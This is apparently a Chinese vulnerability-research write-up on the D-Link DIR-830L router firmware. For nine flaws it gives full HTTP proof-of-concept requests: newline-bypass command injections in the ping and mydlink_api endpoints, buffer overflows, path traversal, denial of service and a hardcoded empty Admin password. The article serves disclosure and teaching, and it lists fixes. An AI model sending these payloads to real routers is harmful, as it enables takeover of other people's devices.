# [IoT]D-LINK DIR-830L路由器漏洞挖掘汇总-先知社区

> **来源**: https://xz.aliyun.com/news/16711  
> **文章ID**: 16711

---

本文详细记录了对D-LINK DIR830L型号的路由器进行漏洞复现与漏洞挖掘的过程。除了已有公开的漏洞以外，还挖掘了更多新的漏洞。

D-LINK路由器漏洞是我学习IoT安全时接触的第一个vendor的路由器。在根据网上公开资料进行复现时，自己也挖掘出更多的新的漏洞，特此记录一下漏洞挖掘过程，供更多的人学习，交流。

本文提到的所有漏洞均已报送CVE，CNVD，请勿用于非法用途！

# 1. 厂商简介

友讯科技股份有限公司成立于1986年，专注于电脑网路设备的设计开发，并自创「**D-Link**」品牌，行销全球。 目前已在全世界70余国设立超过160个行销据点，产品销售遍布全球170多个主要市场，全球品牌营收超过10亿美金，为全球前三大专业网路公司。 友讯科技的主要产品为交换器、无线、宽频及数位家庭等网路产品，在全球中小企业及家庭网路市场，为领导网通品牌。

在D-Link DIR-830L A1路由器中存在多处漏洞，包括命令注入，缓冲区溢出，凭据硬编码，目录遍历等漏洞。

# 2. 固件信息/仿真环境

## 固件信息

固件版本：DIR830LA1\_FW100B07

固件下载地址：[legacyfiles.us.dlink.com - /DIR-830L/REVA/FIRMWARE/](https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/)

固件是否加密：否

固件提取方式：binwalk -Me

## 仿真环境

用 FirmAE即可进行仿真。

<https://github.com/pr0v3rbs/FirmAE>

# 3. 漏洞详细分析

核心二进制文件是 sbin/ncc2这个二进制文件。

然后web和bin之间的桥梁就是 callback\_xxx这种类型的函数。

## 1. `cancelPing` Buffer Overflow

830L和820L一样的，都有这个地方的栈溢出，参考

```
https://github.com/1759134370/iot/blob/main/D-LINK/DIR-820L.md
```

找到漏洞点：  
![image.png](images/51e5ca94-d809-3084-a9c6-579308fc2c14)

回溯找到调用点：  
![image.png](images/a0107587-2f1d-385e-8850-24e632767999)

本质还是从`callback_ccp_ping`传过来的：  
![image.png](images/0c5bdd64-e17a-353e-9001-9b60c63d1287)

这个请求触发也得根据这个格式来，  
`ccp_act=cancelPing&nextPage=xxxx`

注意到`char v10[260]`，由于我们只是PoC，不必构造Exploit，不需要考虑那么多栈布局，直接发超长包就行了。

触发PoC：  
注意：

1. 得带上登录的cookie（空密码）
2. 发两遍

```
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Connection: close

Referer: http://192.168.0.1/Home.html

Cookie: uid=DdK2d6Kq3d

If-Modified-Since: Mon, 18 Aug 2014 09:26:05 GMT

Content-Length: 28


ccp_act=cancelPing&nextPage=xxxx...（这里省略若干）
```

![image.png](images/f1f2c3a6-0c91-39cc-8325-a1350d964bf1)

![image.png](images/3859bcb2-a1d6-3d02-8350-8a09d9fa9aa9)  
![image.png](images/3bc454ef-f52b-3bd7-b8f4-d05fa1ea9648)  
![image.png](images/93144187-d8b0-3b87-a604-3146ac2b14c1)

## 2. `ping_v4` Command Injection

也是在`callback_ccp_ping`处回调的：  
![image.png](images/376e6b40-a342-331d-a11e-58e4672c72ab)

`ping_addr`参数是用户前端输入的：  
![image.png](images/6d01e860-1f09-3900-aea9-19bc8414b0f5)

最终会在这里拼接到`_system`的参数中调用，由于过滤不全，导致了命令注入漏洞：  
![image.png](images/26fdce1e-5ed8-370f-95cd-c84793ae4be4)

前面过滤了

* ;

我们可以用`%0a`换行符绕过

PoC:

```
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=SN5icKpv49

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 58


ccp_act=ping_v4&&ping_addr=127.0.0.1%0als />/www/poc1.html
```

![image.png](images/ac803b23-0895-3457-aca0-171135b8c6fc)

![image.png](images/0cff7708-b8fe-3dfd-bd30-1b7ea0aa7135)

这么看的话，`ping_v6`也应该有一样的洞

## 3. `ping_v6` Command Injection

跟 `ping_v4`一样的原理，这里直接给出分析结果和PoC了。

![image.png](images/fba0fbd6-dc58-38b1-b44e-e1763ffac310)

![image.png](images/6a3bf0e5-4ede-3e79-9221-53be63d40bbc)

PoC:

```
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=GLW7nuM5Vi

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 62


ccp_act=ping_v6&&ping_addr=127.0.0.1%0abusybox >/www/poc2.html
```

![image.png](images/553b086b-8e2f-3fd8-a73c-b318fd0b43c2)

![image.png](images/204fc905-54a2-3cda-a8c4-0d06b91e457c)

## 4. `sub_450E7C` Buffer Overflow

在ncc2 `callback_ccp_get_set`中调用了`sub_450E7C`：

![image.png](images/125c4df9-e928-3997-8691-52731fa18795)

`sub_450E7C`函数，

![image.png](images/aff2e2ed-3333-3909-88c1-4d8b6f76d66e)

调用了危险函数`sprintf`，且参数都是用户从前端输入的，全部可控。

按照路由规则，我们访问`get_set.ccp`

```
POST /get_set.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=32sLwqx3Oz

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 24280


ccp_act=setStorage&old_ip=BufferOverflow!!!aaa...(省略一大堆a)&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=back.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440&lanHostCfg_DeviceName_1.1.1.0=dlinkrouter&lanHostCfg_AlwaysBroadcast_1.1.1.0=0&lanHostCfg_NetBIOSAnnouncement_1.1.1.0=0&lanHostCfg_NetBIOSLearn_1.1.1.0=0&lanHostCfg_NetBIOSScope_1.1.1.0=&lanHostCfg_NetBIOSNodeType_1.1.1.0=2&lanHostCfg_PrimaryWINSAddress_1.1.1.0=0.0.0.0&lanHostCfg_SecondaryWINSAddress_1.1.1.0=0.0.0.0&1656465291297=1656465291297
```

![](file://D:/N0zoM1z0/Sec-Learning/%E6%96%87%E7%AB%A0%E6%8A%95%E7%A8%BF/WRITING/%5BIoT%5DD-LINK%20DIR-830L%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%B1%87%E6%80%BB/images/DIR830-Buffer-Overflow.gif?lastModify=1738040716)![](file://D:/N0zoM1z0/Sec-Learning/%E6%96%87%E7%AB%A0%E6%8A%95%E7%A8%BF/WRITING/%5BIoT%5DD-LINK%20DIR-830L%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%B1%87%E6%80%BB/images/DIR830-Buffer-Overflow.gif?lastModify=1738040716)![](file://D:/N0zoM1z0/Sec-Learning/%E6%96%87%E7%AB%A0%E6%8A%95%E7%A8%BF/WRITING/%5BIoT%5DD-LINK%20DIR-830L%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%B1%87%E6%80%BB/images/DIR830-Buffer-Overflow.gif?lastModify=1738040716)

## 5. `web_access.ccp` Directory Traversal

在`ncc2`二进制文件的`callback_ccp_web_access`函数中，

当`ccp_act=setfolder`时，会调用`sub_4B188C`函数：

![image.png](images/20dd6f6e-8ada-3a07-88a1-5422c14b2ab2)

![image.png](images/3e9f1431-2060-34d3-9047-3426c005ea6e)

尽管后面对传入的参数`folder`和`path`有过滤，但是没有过滤`.`和`/`，导致了路径穿越漏洞，攻击者可以在任意可写路径下创建文件夹。

这里以在网站根目录`/www`创建poc4.html为例。

```
POST /web_access.ccp

ccp_act=setfolder&tok=ip_addr=&folder=poc4.html&path=../../../www
```

![](file://D:/N0zoM1z0/Sec-Learning/%E6%96%87%E7%AB%A0%E6%8A%95%E7%A8%BF/WRITING/%5BIoT%5DD-LINK%20DIR-830L%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%B1%87%E6%80%BB/images/DIR830-Directory-Traversal.gif?lastModify=1738040838)（这里传不了gif，就不放演示效果图了）

## 6. `mydlink_api.ccp` Denial of Service

```
POST /mydlink_api.ccp
```

不传任何payload，就会使网页崩溃。

![](file://D:/N0zoM1z0/Sec-Learning/%E6%96%87%E7%AB%A0%E6%8A%95%E7%A8%BF/WRITING/%5BIoT%5DD-LINK%20DIR-830L%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%B1%87%E6%80%BB/images/DIR830-Directory-Traversal.gif?lastModify=1738040838)（这里传不了gif，就不放演示效果图了）

## 7. `mydlink_api.ccp` Command Injection

在`callback_ccp_mydlink_api`中：

![image.png](images/49e0416d-f42f-35e9-9833-17802eab5d80)

参数`api_page`来自用户输入，可控。

程序对v6没有做任何校验就拼接到了`_system`的调用中，导致了命令注入漏洞。

PoC：

```
POST /mydlink_api.ccp

api_page=;";busybox >/www/poc5.html;%0a"";
```

![image.png](images/18cc709a-4097-3557-87a3-a9dc224a377b)

然后访问`/poc5.html`：

![image.png](images/0d10e194-536a-30cb-bb27-4049ad02f3df)

## 8. `do_login` Hardcoded Credential

在 sbin/ncc2的`do_login`函数中，存在凭据硬编码漏洞：

![image.png](images/90e817eb-e8e2-3a5a-8c85-350e3e1b6577)

HTTP报文：

```
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/Login"

HNAP_AUTH: 13A77F4CAC483FF637E6A359535E0F72 1730100920

Content-Length: 428

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/info/Login.html

Cookie: uid=z9mQNrMzBZ


<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Login xmlns="http://purenetworks.com/HNAP1/">
            <Action>request</Action>
            <Username>Admin</Username>
            <LoginPassword></LoginPassword>
            <Captcha></Captcha>
        </Login>
    </soap:Body>
</soap:Envelope>
```

## 9. `pingV4Msg` Command Injection

刚开始尝试`pingV4Msg`的注入，但好像不大能bypass，因为它会先做DNS解析，resolve不了就不执行system了：

![image.png](images/6fc6f595-ef34-3310-93cb-73f98c8028c5)

```
POST /ping.ccp

ccp_act=pingV4Msg&ping_addr=localhost%0abusybox >/www/poc3.html
```

报错：

![image.png](images/2463ae96-ac7d-3896-9c0a-245add2e7b15)

但是后面发现可以绕过

正如web里面学到的绕过preg\_match常用 `\`一样，这里可以用%0a换行符绕过。

换行符就可以绕过正则匹配。。。

```
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=HIVZV0Zk1C

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 63


ccp_act=pingV4Msg&ping_addr=127.0.0.1%0abusybox >/www/poc3.html
```

![image.png](images/2500c827-d699-3b36-8947-8d4e66e6aabd)

![image.png](images/7ea7d97f-ac5b-3d36-b7c5-866530e99da1)

成功绕过~

# 4. 漏洞汇总/经验总结

|  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- |
| **漏洞编号** | **漏洞类型** | **影响组件** | **攻击方式** | **PoC** | **修复建议** |
| 1 | Buffer Overflow | `cancelPing` | 发送超长请求触发栈溢出 | 发送超长`nextPage`参数的请求 | 增加输入长度检查，避免栈溢出 |
| 2 | Command Injection | `ping_v4` | 通过`ping_addr`参数注入命令 | 发送带有`%0a`绕过过滤的命令注入请求 | 对用户输入进行更严格的过滤和校验 |
| 3 | Command Injection | `ping_v6` | 通过`ping_addr`参数注入命令 | 发送带有`%0a`绕过过滤的命令注入请求 | 对用户输入进行更严格的过滤和校验 |
| 4 | Buffer Overflow | `sub_450E7C` | 通过超长字符串触发栈溢出 | 发送超长`Interface`字段的请求 | 增加输入长度检查，避免栈溢出 |
| 5 | Directory Traversal | `web_access.ccp` | 利用路径穿越上传恶意文件 | 发送带有路径穿越的文件上传请求 | 对路径参数进行严格过滤，防止路径穿越攻击 |
| 6 | Denial of Service | `mydlink_api.ccp` | 不传任何payload导致崩溃 | 发送不带有效负载的请求 | 增加对无效输入的检测，防止服务拒绝 |
| 7 | Command Injection | `mydlink_api.ccp` | 通过`api_page`注入命令 | 发送恶意命令注入请求 | 对`api_page`等参数进行严格过滤，防止命令注入攻击 |
| 8 | Hardcoded Credential | `do_login` | 使用硬编码凭证进行登录验证 | 发送带有硬编码凭证的登录请求 | 删除硬编码凭证，使用更安全的认证方式 |
| 9 | Command Injection | `pingV4Msg` | 通过`ping_addr`注入命令 | 发送恶意命令注入请求，%0a绕过 | 对`ping_addr`进行严格过滤，防止命令注入攻击 |

​

在挖掘D-LINK 系列路由器的时候，从网上公开的资料学到了很多：

1. 关键是找到web端和bin端连接的桥梁。对于DIR830L系列就是sbin/ncc2中的callback\_xxx函数
2. 善用 grep -r 搜索关键信息。通过web端bp抓包的参数，可以用grep -r在固件文件中搜索，定位关键二进制文件。
3. %0a等绕过waf的方法。web安全中的bypass技巧同样适用于IoT的web端输入。
